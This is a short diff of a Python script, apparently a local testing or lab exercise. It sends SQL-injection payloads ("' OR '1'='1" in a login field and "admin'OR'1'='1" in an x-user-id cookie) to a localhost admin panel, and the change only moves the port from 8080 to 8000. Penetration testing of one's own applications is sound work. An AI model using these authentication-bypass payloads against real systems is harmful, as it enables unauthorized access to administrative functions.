@@ -25,7 +25,7 @@ OLDMUTATED = "4w2246french44pledge0r"
 #resp = requests.post(url, data={"username": "' OR '1'='1", "password": "password"})
 
 cookies = {"x-user-id": "admin'OR'1'='1"}
-resp = requests.get("http://localhost:8080/admin/panel", cookies=cookies)
+resp = requests.get("http://localhost:8000/admin/panel", cookies=cookies)
 
 print(resp.status_code)
 print(resp.request.headers)
